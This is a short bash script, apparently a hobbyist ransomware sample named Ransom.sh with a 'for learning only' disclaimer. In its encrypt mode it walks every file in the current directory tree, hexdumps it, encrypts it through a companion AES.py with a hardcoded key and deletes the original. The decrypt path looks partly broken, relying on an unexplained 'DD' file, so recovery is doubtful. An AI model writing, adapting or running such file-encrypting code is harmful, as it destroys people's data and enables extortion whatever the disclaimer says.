#!/bin/bash

# THIS PROGRAM IS INTEDED FOR HAVING FUN & LEARNING ONLY
# DO NOT EXPLOIT OTHERS WITH THIS PROGRAM
# ONLY EXECUTE IN A SAFE ENVIRONMENT
# EXECUTION WILL BE ON YOUR OWN REPONSIBILITY

echo -n "Would You Like To Encrypt Or Decrypt (Hexdump) (1/2)>"
read mode

# Code Method Using `xxd` As A Hexdump Creator And Reverter In Order To Successfully Transform The Files With Maximum Precision From Hexdump to Original File And Vice Versa

if [ $mode = '1' ]
then
    echo "==================================================="
    echo "============== GATHERING INFORMATION =============="
    files=`find . -path ./.git -prune -false -o -type f`
    files=($(echo $files | tr '\b' '\n'))
    echo $files
    numOptions=${#files[@]}
    for (( counter=0; counter<${numOptions}; counter++))
    do
        if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh' ]
        then
            unset -v 'files[$counter]'
            continue
        fi
        echo ${files[counter]}
        `xxd ${files[counter]} > HD`
        `./AES.py 'QVZBTEFOQ0hFUg==' "HD" 1`
        `rm ${files[counter]}`
        `cat HD > ${files[counter]}`
        `rm HD`
    done
    echo "============= Encryption Successful ==============="
    echo "==================================================="
elif [ $mode = '2' ]
then
    echo "==================================================="                   
    echo "============== GATHERING INFORMATION =============="
    files=`find . -path ./.git -prune -false -o -type f`                         
    files=($(echo $files | tr '\b' '\n'))                                        
    numOptions=${#files[@]}                                                             
    for (( counter=0; counter<${numOptions}; counter++))                         
    do                                                                           
        if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh' ]                                                                                
        then                                                                     
            unset -v 'files[$counter]'     
            continue
        fi
        echo ${files[counter]}
        `./AES.py 'QVZBTEFOQ0hFUg==' "${files[counter]}" 2`
        `xxd -r DD > ${files[counter]}`
        `rm DD`
    done
    echo "============= Decryption Successful ==============="
    echo "==================================================="

fi

# =========================== By Avalancher ===============================

